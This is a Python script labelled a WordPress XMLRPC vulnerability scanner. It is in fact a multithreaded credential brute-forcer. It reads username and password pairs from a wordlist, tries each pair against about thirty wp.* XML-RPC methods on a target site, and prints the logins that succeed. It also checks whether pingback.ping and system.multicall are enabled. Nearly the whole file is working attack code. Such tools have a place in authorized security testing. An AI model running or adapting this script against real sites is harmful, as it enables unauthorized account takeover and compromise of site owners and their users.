import argparse
import xmlrpc.client
import concurrent.futures

def parse_arguments():
    parser = argparse.ArgumentParser(description="WordPress XMLRPC Vulnerability Scanner")
    parser.add_argument("-u", "--url", help="URL of the targeted site", required=True)
    parser.add_argument("-w", "--wordlist", help="Path to the wordlist file containing usernames and passwords separated by a space", required=True)
    parser.add_argument("-t", "--threads", help="Number of threads to use for authentication", default=20, type=int)
    return parser.parse_args()

def test_authentication(method, server, username, password):
    try:
        getattr(server, method)("1", username, password)
        print(f"{method} allows authentication with {username}:{password}")
    except xmlrpc.client.Fault as err:
        if err.faultCode == 401:
            print(f"{method} authentication failed for {username}:{password}")
    except:
        print(f"An unexpected error occurred while testing credentials: {username}:{password}")

def test_method(server, method, username, password):
    if method in ["pingback.ping", "system.multicall"]:
        try:
            getattr(server, method)()
            print(f"{method} is enabled.")
        except:
            pass
    else:
        test_authentication(method, server, username, password)

def main():
    args = parse_arguments()
    url = f"https://www.{args.url}/xmlrpc.php"
    server = xmlrpc.client.Server(url)

    try:
        server.system.listMethods()
    except:
        print("XMLRPC is disabled.")
        return

    allowed_methods = server.system.listMethods()
    methods_to_check = [
        "wp.getUsersBlogs", "wp.getUsers", "wp.getProfile", "wp.getAuthors", "wp.getComments",
        "wp.getPageTemplates", "wp.getTaxonomies", "wp.getTerms", "wp.getPostFormats", "wp.getPostStatuses",
        "wp.getPostTypes", "wp.newCategory", "wp.newComment", "wp.newPage", "wp.newPost", "wp.editComment",
        "wp.editPage", "wp.editPost", "wp.deleteComment", "wp.deletePage", "wp.deletePost", "wp.getCommentCount",
        "wp.getPageList", "wp.getPost", "wp.getPage", "wp.getRecentPosts", "wp.getTags", "wp.getTerm",
        "wp.getTermsBy", "wp.getMediaItem", "wp.getMediaLibrary", "wp.getMediaItemMimeType", "wp.uploadFile"
    ]

    methods_set = set(methods_to_check)
    intersection = methods_set.intersection(allowed_methods)

    if len(intersection) == 0:
        print("No methods for authentication available.")
        return

    with open(args.wordlist, 'r') as file:
        lines = file.read().splitlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for line in lines:
            username, password = line.strip().split()
            for method in intersection:
                futures.append(executor.submit(test_method, server, method, username, password))
        
        for future in concurrent.futures.as_completed(futures):
            pass

if __name__ == "__main__":
    main()
